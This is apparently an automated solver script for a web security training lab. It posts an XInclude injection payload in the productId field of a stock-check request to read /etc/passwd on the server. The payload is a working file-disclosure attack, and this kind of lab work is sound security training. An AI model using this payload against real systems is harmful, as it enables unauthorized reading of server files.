const { runLab } = require('./_common.cjs');

const TITLE = 'Discovering vulnerabilities quickly with targeted scanning';
const PATH = '/web-security/essential-skills/using-burp-scanner-during-manual-testing/lab-discovering-vulnerabilities-quickly-with-targeted-scanning';

runLab({
  title: TITLE,
  path: PATH,
  solve: async ({ page }) => {
    const payload = '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>';
    await page.evaluate(async (xinclude) => {
      const body = new URLSearchParams({
        productId: '1' + xinclude,
        storeId: '3',
      });
      await fetch('/product/stock', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: body.toString(),
      });
    }, payload);
    await page.waitForTimeout(1200);
  },
});
